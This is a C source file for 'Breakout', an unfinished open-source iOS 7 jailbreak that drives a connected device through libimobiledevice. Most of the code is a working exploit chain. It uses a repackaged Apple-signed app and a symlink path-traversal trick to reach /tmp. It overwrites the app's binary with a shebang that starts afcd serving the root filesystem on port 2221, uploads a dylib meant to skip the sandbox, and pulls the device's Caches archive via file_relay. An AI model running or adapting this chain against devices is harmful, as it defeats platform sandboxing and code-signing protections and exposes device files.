//
//  breakout.c
//  Breakout
//
//  Created by Joshua Lee Tucker on 31/12/2013.
//  Copyright (c) 2013 Bandit Labs. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#include <breakout.h>

#include <libimobiledevice/afc.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/installation_proxy.h>
#include <libimobiledevice/file_relay.h>

uint64_t gFh = 0;
unsigned int cb = 0;
unsigned int installError = 0;
unsigned int installing = 1;

idevice_t gDevice = NULL;
afc_client_t gAfc = NULL;
lockdownd_client_t gLockdown = NULL;
instproxy_client_t gInstproxy = NULL;
file_relay_client_t gFrc = NULL;

void printSplash(void) {
	// uses colour macros in breakout.h
	printf("\n");
	printf(" [*] Breakout - the ");
	printf("%sopen-source", KGRN);
	printf(" %siOS 7 jailbreak.\n", KNRM);
	printf(" [*] by your friendly neighbourhood hustler, ");
	printf("%sDarkMalloc%s.\n\n", KGRN, KNRM);
}

int afc_send_file(afc_client_t afc, const char* local, const char* remote) {
	FILE* fd = NULL;
	uint64_t fh = 0;
	afc_error_t err = 0;
	unsigned int got = 0;
	unsigned int gave = 0;
	unsigned char buffer[0x800];

	fd = fopen(local, "rb");
	if (fd != NULL ) {
		err = afc_file_open(afc, remote, AFC_FOPEN_WR, &fh);
		if (err == AFC_E_SUCCESS) {

			while (!feof(fd)) {
				memset(buffer, '\0', sizeof(buffer));
				got = fread(buffer, 1, sizeof(buffer), fd);
				if (got > 0) {
					afc_file_write(afc, fh, (const char*) buffer, got, &gave);
					if (gave != got) {
						printf("Error!!\n");
						break;
					}
				}
			}

			afc_file_close(afc, fh);
		}
		fclose(fd);
	} else
		return -1;
	return 0;
}

static int afc_remove_directory(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		printf("Could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL ) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*) malloc(strlen(path) + 1 + strlen(*ptr) + 1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i += 2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i + 1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			afc_remove_directory(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
}

static void cp_recursive(const char* from, const char* to) {
	if (!from || !to) {
		return;
	}
	DIR* cur_dir = opendir(from);
	if (cur_dir) {
		struct stat tst;
		struct stat fst;
		if ((stat(from, &fst) == 0) && S_ISDIR(fst.st_mode)) {
			if (stat(to, &tst) != 0) {
				printf("creating new folder at %s", to);
				mkdir(to, fst.st_mode);
			}
		}
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0)
					|| (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}

			char *tpath = (char*) malloc(
					strlen(to) + 1 + strlen(ep->d_name) + 1);
			char *fpath = (char*) malloc(
					strlen(from) + 1 + strlen(ep->d_name) + 1);
			if (fpath && tpath) {
				struct stat st;
				strcpy(fpath, from);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				strcpy(tpath, to);
				strcat(tpath, "/");
				strcat(tpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					printf("copying folder %s to %s\n", fpath, tpath);
					cp_recursive(fpath, tpath);
				} else {

					printf("copying file %s to %s\n", fpath, tpath);
					if (cp(fpath, tpath) != 0) {
						printf("could not copy file %s\n", fpath);
					}
				}

				free(tpath);
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	return;
}

static void mv_recursive(const char* from, const char* to) {
	cp_recursive(from, to);
	rm_recursive(from);
}

static afc_send_directory(afc_client_t* afc, const char* local,
		const char* remote) {
	if (!local || !remote) {
		return 0;
	}
	DIR* cur_dir = opendir(local);
	if (cur_dir) {
		struct stat tst;
		struct stat fst;
		if ((stat(local, &fst) == 0) && S_ISDIR(fst.st_mode)) {
			afc_make_directory(afc, remote);
		}
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0)
					|| (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}

			char *tpath = (char*) malloc(
					strlen(remote) + 1 + strlen(ep->d_name) + 1);
			char *fpath = (char*) malloc(
					strlen(local) + 1 + strlen(ep->d_name) + 1);
			if (fpath && tpath) {
				struct stat st;
				strcpy(fpath, local);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				strcpy(tpath, remote);
				strcat(tpath, "/");
				strcat(tpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					afc_send_directory(afc, fpath, tpath);
				} else {

					if (afc_send_file(afc, fpath, tpath) != 0) {
					}
				}

				free(tpath);
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	return 0;
}

afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
		const char* local) {
	int exit = 0;
	FILE* fd = NULL;
	uint64_t fh = 0;
	afc_error_t err = 0;
	unsigned int got = 0;
	unsigned int gave = 0;
	unsigned char buffer[0x800];

	fd = fopen(local, "wb");
	if (fd != NULL ) {
		err = afc_file_open(afc, remote, AFC_FOPEN_RDONLY, &fh);
		if (err == AFC_E_SUCCESS) {

			while (1) {
				memset(buffer, '\0', sizeof(buffer));
				err = afc_file_read(afc, fh, (const char*) buffer,
						sizeof(buffer), &got);
				if (err == AFC_E_SUCCESS && got > 0) {
					gave = fwrite(buffer, 1, got, fd);
					if (err != AFC_E_SUCCESS || gave != got)
						break;

				} else
					break;
			}

			afc_file_close(afc, fh);
		}
		fclose(fd);
	} else
		return err;

	printf("Copied %s -> %s\n", remote, local);
	return err;
}

void minst_cb(const char *operation, plist_t status, void *unused) {
	cb++;
	if (cb == 8) {
		printf(" [*] Injection vector found - ", cb);
		printf("Injecting exploit...\n");
	}
	if (status && operation) {
		plist_t npercent = plist_dict_get_item(status, "PercentComplete");
		plist_t nstatus = plist_dict_get_item(status, "Status");
		plist_t nerror = plist_dict_get_item(status, "Error");
		int percent = 0;
		char *status_msg = NULL;
		if (npercent) {
			uint64_t val = 0;
			plist_get_uint_val(npercent, &val);
			percent = val;
		}
		if (nstatus) {
			plist_get_string_val(nstatus, &status_msg);
			if (!strcmp(status_msg, "Complete")) {
				sleep(1);
				installing = 0;
			}
		}

		if (nerror) {
			char *err_msg = NULL;
			plist_get_string_val(nerror, &err_msg);
			printf("Error: %s", err_msg);
			printf("%s [*] Unable to install app. Please reboot your device and try again.%s\n\n", KRED, KNRM);
			free(err_msg);
			installing = 0;
			installError = 1;
		}
	} else {
		printf("%s: called with invalid data!\n", __func__);
	}
}

int main(int argc, char *argv[]) {
	
	// let's clean this up a little bit.
	printSplash();
	
	// attempt to connnect to device (using libimobiledevice)...
	printf(" [*] Attempting to connect to device...\n");
	idevice_error_t ideverr = 0;
	ideverr = idevice_new(&gDevice, NULL);
	if (ideverr != IDEVICE_E_SUCCESS) {
		printf("%s [*] Unable to connect to device. Check your device is plugged in and turned on.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// grab UDID to show which device we're connected to.
	char *udid;
	ideverr = idevice_get_udid(gDevice, &udid);
	if (ideverr != IDEVICE_E_SUCCESS) {
		printf("%s [*] Unable to communicate with device. Check your device is plugged in and turned on.%s\n\n", KRED, KNRM);
	}
	
	printf("%s [*] Successfully connected to device with UDID: %s!%s\n\n", KGRN, udid, KNRM);
	
	// start lockdownd client.
	printf(" [*] Attempting to connect to lockdownd...\n");
	lockdownd_error_t lderr = 0;
	lderr = lockdownd_client_new_with_handshake(gDevice, &gLockdown, "Breakout");
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to connect to lockdownd. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully connected to lockdownd on device: %s!%s\n\n", KGRN, udid, KNRM);
	
	// start AFC service on lockdownd.
	printf(" [*] Attempting to start AFC service...\n");
	lockdownd_service_descriptor_t port = NULL;
	lderr = lockdownd_start_service(gLockdown, "com.apple.afc", &port);
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to start AFC service. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully started AFC service!%s\n\n", KGRN, KNRM);
	
	// create an AFC client .
	printf(" [*] Attempting to create a new AFC client...\n");
	afc_error_t afcerr = 0;
	afcerr = afc_client_new(gDevice, port, &gAfc);
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to create a new AFC client. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	lockdownd_client_free(gLockdown);
	gLockdown = NULL;
	
	printf("%s [*] Successfully created new AFC client!%s\n\n", KGRN, KNRM);
		
	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
	printf(" [*] Performing sanity checks...\n");
		
	afcerr = afc_read_directory(gAfc, "/Downloads/WWDC.app", NULL);
	if (afcerr != AFC_E_SUCCESS) {
		afc_remove_path(gAfc, "/Downloads/WWDC.app");
	}
	
	afcerr = afc_read_directory(gAfc, "/Breakout-Install", NULL);
	if (afcerr != AFC_E_SUCCESS) {
		afc_remove_path(gAfc, "/Breakout-Install");
	}
	
	printf("%s [*] Sanity checks complete!!%s\n\n", KGRN, KNRM);
		
	printf(" [*] Attempting to create Breakout-Install directory and push required files...\n");
	
	// create a directory in /var/mobile/Media to store our stuff.
	afcerr = afc_make_directory(gAfc, "/Breakout-Install");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to create a Breakout-Install directory. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		afc_client_free(gAfc);
		idevice_free(gDevice);
		return -1;
	}
	
	// upload our custom icon, which is set in the new Info.plist to be uploaded.
	afcerr = afc_send_file(gAfc, "resources/jbicon.png", "Breakout-Install/jbicon.png");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to push required files. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully created Breakout-Install directory and pushed required files!%s\n\n", KGRN, KNRM);
	
	// we need this for installd to happily install our custom app :)
	printf(" [*] Downloading code-signed app from Apple...\n");
	//	system("curl -b \"downloadKey=expires=1388797203~access=/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa*~md5=5bb2ef2cc0ee1f435361e121a1ee2514\" http://a396.phobos.apple.com/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa -o resources/wwdc.ipa > /dev/null");
	printf("%s [*] Successfully downloaded app!%s\n\n", KGRN, KNRM);
	
	// I know this is ugly and definitely not elegant, but it's easy.
	system("unzip resources/wwdc.ipa > /dev/null");
	system("cp -r Payload/WWDC.app resources/");
	system("cp resources/Info.plist Payload/WWDC.app/Info.plist > /dev/null");
	system("zip -r resources/breakout.ipa Payload/ META-INF/ > /dev/null");
	system("rm -r Payload META-INF > /dev/null");
		
	// un-modified version of WWDC.app
	printf(" [*] Attempting to upload original app to /Downloads...\n");

	afcerr = afc_send_directory(gAfc, "resources/WWDC.app", "Downloads/WWDC.app");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to upload original app to /Downloads. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// we don't need this anymore, clear it.
	system("rm -rf resources/WWDC.app > /dev/null");
		
	printf("%s [*] Successfully uploaded app!%s\n\n", KGRN, KNRM);
	
	printf(" [*] Attempting to upload custom IPA to /Breakout-Install...\n");
	
	afcerr = afc_send_file(gAfc, "resources/breakout.ipa", "Breakout-Install/breakout.ipa");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Unable to upload custom IPA. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// we don't need this anymore, clear it.
	system("rm -rf resources/breakout.ipa > /dev/null");
	
	printf("%s [*] Successfully uploaded custom IPA!%s\n\n", KGRN, KNRM);
	
	// reconnect
	printf(" [*] Attempting to connect to lockdownd...\n");
	lderr = lockdownd_client_new_with_handshake(gDevice, &gLockdown,
			"installclient");
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to connect to lockdownd. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully connected to lockdownd!%s\n\n", KGRN, KNRM);
	
	// com.apple.mobile.installation_proxy
	printf(" [*] Attempting start installation proxy service...\n");
	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.installation_proxy", &port);
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to start installation proxy service. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		return -1;
	}
	
	printf("%s [*] Successfully started installation proxy service!%s\n\n", KGRN, KNRM);

	printf(" [*] Attempting to connect to installation proxy service...\n");
	instproxy_error_t ie = 0;
	instproxy_client_t instproxy = NULL;
	ie = instproxy_client_new(gDevice, port, &instproxy);
	if (ie != INSTPROXY_E_SUCCESS) {
		printf("%s [*] Unable to connect to installation proxy service. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully connected to installation proxy service!%s\n\n", KGRN, KNRM);
	
	// installs our modified ipa for us, thanks installd
	printf(" [*] Requesting installation proxy to install custom app...\n");
	
	plist_t opts = instproxy_client_options_new();
	ie = instproxy_install(instproxy, "Breakout-Install/breakout.ipa", opts, &minst_cb, NULL );
	if (ie != INSTPROXY_E_SUCCESS) {
		printf("%s [*] Installation proxy could not install app. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		instproxy_client_options_free(opts);
		instproxy_client_free(instproxy);
		return -1;
	}
	
	while (installing) {
		sleep(1);
	}
	
	if (installError) {
		return -1;
	}
	
	printf("%s [*] Installation proxy successfully installed app!%s\n\n", KGRN, KNRM);
		
	// symlink to /tmp, count the ../../'s
	printf(" [*] Attempting to get access to /tmp through symlink hacks...\n");
	
	afcerr = afc_make_directory(gAfc, "Downloads/a/a/a/a/a");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	afcerr = afc_make_link(gAfc, 2, "../../../../../tmp", "Downloads/a/a/a/a/a/link");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	afcerr = afc_rename_path(gAfc, "Downloads/a/a/a/a/a/link", "tmp");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not write symlink to get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// check if we actually have access to /tmp
	char **list = NULL;
	afcerr = afc_read_directory(gAfc, "tmp/", &list);
	if (list == NULL) {
		printf("%s [*] Could not get access to /tmp. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully got access to /tmp!%s\n\n", KGRN, KNRM);	

	
	// replace Downloads/WWDC.app/WWDC with our shebang to launch afcd
	printf(" [*] Attempting to replace original binary with shebang...\n");
	
	uint32_t bw = 0;
	afc_file_open(gAfc, "Downloads/WWDC.app/WWDC", AFC_FOPEN_RW, &gFh);
	afc_file_truncate(gAfc, gFh, 0);
	char *shebang = "#!/usr/libexec/afcd -S -p 2221 -d /\n";
	afc_file_write(gAfc, gFh, shebang, strlen(shebang) -1, &bw);
	if (bw > 0) {
		printf("%s [*] Successfully replaced binary with shebang!%s\n\n", KGRN, KNRM);
	} else {
		printf("%s [*] Could not write overwrite binary. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	// upload gameover.dylib - when loaded, doesn't init sandbox for afcd
	printf(" [*] Attempting to upload gameover.dylib...\n");
	afcerr = afc_send_file(gAfc, "resources/gameover.dylib", "Downloads/WWDC.app/");
	if (afcerr != AFC_E_SUCCESS) {
		printf("%s [*] Could not upload gameover.dylib. Please reboot your device and try again.%s\n\n", KRED, KNRM);
		return -1;
	}
	
	printf("%s [*] Successfully uploaded gameover.dylib!%s\n\n", KGRN, KNRM);
	
	//getting caches
	printf(" [*] Attempting to start file_reay\n");
	
	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.file_relay", &port);
	
	if (lderr != LOCKDOWN_E_SUCCESS) {
		printf("%s [*] Unable to start file_relay service! %s\n", KRED, KNRM);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	printf("%s [*] Successfully started file_relay service!%s\n\n", KGRN, KNRM);
	
	
	if (gLockdown) {
		lockdownd_client_free(gLockdown);
		gLockdown = NULL;
	}
	
	file_relay_error_t frcerr = 0;
	
	frcerr = file_relay_client_new(gDevice, port, &gFrc);	
	
	if (frcerr != FILE_RELAY_E_SUCCESS) {
		printf("could not connect to file_relay service!\n");
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	
	idevice_connection_t dump = NULL;
	const char *sources[] = {"Caches", NULL};
	
	printf(" [*] Attempting to get Caches \n");
	
	if (file_relay_request_sources(gFrc, sources, &dump) != FILE_RELAY_E_SUCCESS) {
		printf("could not get Caches\n");
		file_relay_client_free(gFrc);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	if (!dump) {
		printf("did not get connection!\n");
		file_relay_client_free(gFrc);
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	
	uint32_t cnt = 0;
	uint32_t len = 0;
	char buf[4096];
	FILE *f = fopen("resources/caches.cpio.gz", "w");
	setbuf(stdout, NULL);
	printf(" [*] Receiving Caches ... pls wait");
	while (idevice_connection_receive(dump, buf, 4096, &len) == IDEVICE_E_SUCCESS) {
		fwrite(buf, 1, len, f);
		cnt += len;
		len = 0;
	}
	printf("\n");
	fclose(f);
	printf("%s [*] Total size received: %d\n\n %s", KGRN,cnt, KNRM);
	
	
	//unpacking caches
	
	system("mkdir resources/extracted > /dev/null");
	system("tar -C resources/extracted -xvf resources/caches.cpio.gz > /dev/null");
	system("mv resources/extracted/var/mobile/Library/Caches/com.apple.mobile.installation.plist resources/");
	system("mv resources/extracted/var/mobile/Library/Caches/com.apple.LaunchServices-055.csstore resources/");
	
	//not finished here
	system("rm -rf resources/extracted/ resources/caches.cpio.gz > /dev/null");	
		
	
	// obviously there's a lot more to implement.
	printf("That runned successfully for now yey :D\n");
	
	return 0;
	
}